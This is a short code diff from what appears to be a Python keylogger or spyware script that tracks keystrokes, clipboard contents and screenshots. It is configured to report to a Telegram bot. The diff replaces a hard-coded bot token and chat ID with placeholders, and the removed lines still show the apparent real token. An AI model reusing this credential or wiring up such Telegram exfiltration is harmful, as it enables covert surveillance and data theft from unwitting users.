@@ -14,8 +14,8 @@ except ImportError:
     import mss
     from PIL import Image
 
-bot_token = '7762380331:AAEDulbHavLQ03z4k-QVBZbKcPbde5OpPKs'
-chat_id = '1929750150'
+bot_token = 'YOUR_BOT_TOKEN' #Telegram
+chat_id = 'YOUR_CHAT_ID'     #Telegram
 loggedKeys = []
 last_clipboard = ""
 
